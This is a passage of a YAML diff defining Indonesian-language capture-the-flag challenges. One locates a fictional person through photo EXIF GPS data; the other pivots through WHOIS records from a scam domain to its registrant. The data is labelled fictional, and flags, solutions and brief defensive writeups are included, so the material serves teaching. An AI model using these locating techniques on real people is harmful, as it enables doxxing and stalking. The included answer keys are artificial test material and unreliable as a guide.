+      - { title: "Profil @kakushi_goto", body: "Kakushi Korps. Suka gagak dan kue mochi. Tinggal dekat markas." }
+      - { title: "Postingan 3 hari lalu", body: "Latihan pagi di Desa Kirigakure. Kabutnya tebal." }
+      - { title: "Postingan kemarin (foto gagak)", body: "Gagakku Hiro sedang istirahat di atap. #gagak" }
+      - { title: "EXIF foto kemarin", body: "Kamera: Kiri-X100 · Tanggal: 2026-11-04 17:02 · GPS: -7.2501, 110.4012" }
+      - { title: "Peta desa (fiktif)", body: "Desa Kirigakure: -7.1102, 110.3001 · Desa Fujikasane: -7.2501, 110.4012 · Desa Asakusa: -7.3020, 110.5560" }
+  flag: SLAYER{fujikasane}
+  solution: fujikasane
+  writeup: Metadata foto (EXIF GPS) bisa membuka lokasi. Hapus metadata sebelum memposting. Semua data di lab ini fiktif.
+- id: os-domain
+  title: Jejak Pendaftar
+  cat: misc
+  points: 150
+  kind: osint
+  chapter: l2
+  story: Kasus fiktif. Situs palsu "kisatsutai-hadiah.contoh" menipu para slayer. Siapa nama organisasi pendaftarnya?
+  task: Gunakan berkas WHOIS & arsip fiktif. Flag = SLAYER{nama_organisasi} (huruf kecil, spasi jadi _).
+  hints:
+    - "Baca WHOIS domain penipu."
+    - "Email pendaftar dipakai juga di domain lain."
+    - "Organisasi tercantum di WHOIS domain kedua."
+  config:
+    docs:
+      - { title: "WHOIS kisatsutai-hadiah.contoh", body: "Registrar: ContohReg · Registrant: REDACTED FOR PRIVACY · Email: hadiah.palsu@surel.contoh" }
+      - { title: "Pencarian email hadiah.palsu@surel.contoh", body: "Ditemukan sebagai kontak di: tsuzumi-dagang.contoh" }
+      - { title: "WHOIS tsuzumi-dagang.contoh", body: "Registrant Org: Rumah Tsuzumi · Email: hadiah.palsu@surel.contoh" }
+  flag: SLAYER{rumah_tsuzumi}
+  solution: rumah_tsuzumi
+  writeup: Pivoting - satu artefak (email) menghubungkan aset lain. Lab ini memakai data fiktif; OSINT pada orang sungguhan wajib etis dan legal.
